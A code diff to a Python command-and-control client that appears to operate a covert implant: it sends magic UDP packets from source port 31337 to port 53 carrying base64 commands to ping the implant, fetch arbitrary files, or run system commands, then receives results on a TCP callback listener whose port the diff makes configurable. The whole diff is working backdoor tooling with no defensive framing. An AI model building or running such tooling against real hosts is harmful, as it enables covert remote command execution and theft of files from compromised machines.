@@ -7,9 +7,8 @@ import socket
 
 MAGIC_SRC_PORT = 31337
 DEFAULT_DEST_PORT = 53
-TCP_LISTEN_PORT = 8080
-SOCKET_TIMEOUT = 10
-RESPONSE_SIZE = 4196
+DEFAULT_LISTEN_PORT = 8080
+SOCKET_TIMEOUT = 15
 
 SUPPORTED_CMDS = [
     "ping",
@@ -18,10 +17,10 @@ SUPPORTED_CMDS = [
 ]
 
 @contextlib.contextmanager
-def _tcp_listener():
+def _tcp_listener(port):
     """socket listening for the command response"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind(("0.0.0.0", TCP_LISTEN_PORT))
+    sock.bind(("0.0.0.0", port))
     sock.settimeout(SOCKET_TIMEOUT)
     sock.listen(1)
     yield sock
@@ -37,14 +36,16 @@ def _udp_sender():
     sock.close()
 
 
-def _send_cmd(ip, port, msg):
+def _send_cmd(ip, dst_port, tcp_port, msg):
     """sends a magic cmd packet and returns the response"""
-    encoded = base64.b64encode(msg.encode("ascii")) + b"\x00"
+    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
+    encoded = base64.b64encode(msg.encode("ascii"))
+    data = f"{tcp_port};".encode("ascii") + encoded + b"\x00"
 
-    with _tcp_listener() as tcp:
+    with _tcp_listener(tcp_port) as tcp:
         with _udp_sender() as udp:
-            print(f"sending magic packet --> {ip}:{port}")
-            udp.sendto(encoded, (ip, port))
+            print(f"sending magic packet --> {ip}:{dst_port}")
+            udp.sendto(data, (ip, dst_port))
         print("waiting for reply...")
         try:
             sock, addr = tcp.accept()
@@ -63,7 +64,7 @@ def _send_cmd(ip, port, msg):
 def do_ping(args):
     """send a ping"""
     msg = "PING"
-    response = _send_cmd(args.ip, args.dest_port, msg).decode("ascii")
+    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg).decode("ascii")
     if "PONG" not in response:
         raise ValueError("Invalid response received!")
     print(f"Received PONG from {args.ip}")
@@ -72,7 +73,7 @@ def do_ping(args):
 def do_get(args):
     """retrieve a file"""
     msg = f"GET {args.path}"
-    response = _send_cmd(args.ip, args.dest_port, msg)
+    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg)
 
     filename = os.path.basename(args.path)
     out = args.output_path if args.output_path else filename
@@ -85,7 +86,7 @@ def do_get(args):
 def do_exec(args):
     """run a system command"""
     msg = f"EXEC {args.cmd}"
-    response = _send_cmd(args.ip, args.dest_port, msg).decode("ascii")
+    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg).decode("ascii")
     print(f"Command on {args.ip} returned: {response}")
 
 
@@ -98,10 +99,16 @@ if __name__ == "__main__":
         help="IP address of host machine",
     )
     parser.add_argument(
-        "--dest-port",
+        "-d", "--dest-port",
         type=int,
         default=DEFAULT_DEST_PORT,
         help="destination port number",
+    )
+    parser.add_argument(
+        "-l", "--listen-port",
+        type=int,
+        default=DEFAULT_LISTEN_PORT,
+        help="TCP port to listen on for a response"
     )
     # ping
     ping_parser = subparsers.add_parser("ping", help="ping a target")
